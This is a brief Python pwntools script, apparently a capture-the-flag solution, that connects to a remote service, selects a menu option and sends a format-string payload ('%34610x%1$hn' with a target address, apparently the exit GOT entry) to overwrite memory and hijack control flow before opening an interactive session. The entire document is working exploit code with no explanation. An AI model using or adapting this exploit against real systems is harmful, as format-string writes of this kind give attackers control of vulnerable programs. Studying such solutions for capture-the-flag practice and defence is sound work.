from pwn import *

#r = process("./return")
r = remote("103.200.7.150",30301)
exit = p32(0x804a02c)
target = "%34610x" + "%1$hn"
r.sendline("4")
payload = exit + target
r.sendline(payload)
r.recvuntil("yang kamu jual : ")
r.recvrepeat(1)
r.interactive()

